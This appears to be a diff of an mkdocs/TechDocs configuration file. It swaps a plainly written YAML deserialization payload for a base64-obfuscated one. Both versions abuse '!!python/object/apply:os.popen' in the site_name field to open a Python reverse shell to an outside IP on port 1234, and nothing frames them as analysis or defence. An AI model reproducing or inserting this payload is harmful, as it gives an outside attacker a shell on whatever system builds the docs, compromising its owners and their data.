@@ -1,14 +1,7 @@
-site_name:!!python/object/apply:os.popen
-  - |
-    python3 -c 'import socket,os,subprocess;
-    if os.fork() == 0:
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-        s.connect(("34.175.21.161",1234)); 
-        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
-        p=subprocess.call(["/bin/bash","-i"])'
-    echo "RCE_SUCCESS"
+site_name:!!python/object/apply:os.popen ["echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzO2lmIG9zLmZvcmsoKSA9PSAwOnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMzQuMTc1LjIxLjE2MSwxMjM0KSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWy9iaW4vYmFzaCwtaV0pJwo= | base64 -d | bash"]
 plugins:
   - techdocs-core
+
 
 
 
